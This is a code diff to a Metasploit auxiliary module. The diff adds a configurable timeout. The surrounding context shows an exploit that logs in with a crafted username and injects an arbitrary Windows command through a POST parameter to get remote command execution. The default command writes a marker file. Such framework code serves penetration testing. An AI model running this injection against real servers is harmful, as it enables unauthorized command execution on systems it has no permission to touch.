@@ -35,8 +35,13 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptString.new('CMD', [ false, "The command to execute.", "cmd.exe /c echo metasploit > %SYSTEMDRIVE%\\metasploit.txt" ]),
-        OptBool.new('SSL',   [true, 'Use SSL', true]),
+        OptBool.new('SSL',   [ true, 'Use SSL', true ]),
+        OptInt.new('TIMEOUT', [ false, "The timeout in seconds waiting for the server response", 5 ])
       ], self.class)
+  end
+
+  def timeout
+    datastore['TIMEOUT'] || 5
   end
 
   def run
@@ -47,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'	=>  '/login.php',
         'data'	=>  'button=Login&attempt=1&mode=&tab=75&uname=-msf&passwd=msf',
         'method' => 'POST',
-      }, 5)
+      }, timeout)
 
       if res && res.get_cookies.match(/PHPSESSID=(.*);(.*)/i)
 
@@ -59,7 +64,7 @@ class Metasploit3 < Msf::Auxiliary
               'data'  => 'type=Sections&vollist=75' + Rex::Text.uri_encode("&" + cmd),
               'cookie' => res.get_cookies,
               'method' => 'POST',
-            }, 5)
+            }, timeout)
 
           print_status("Done.")
       else
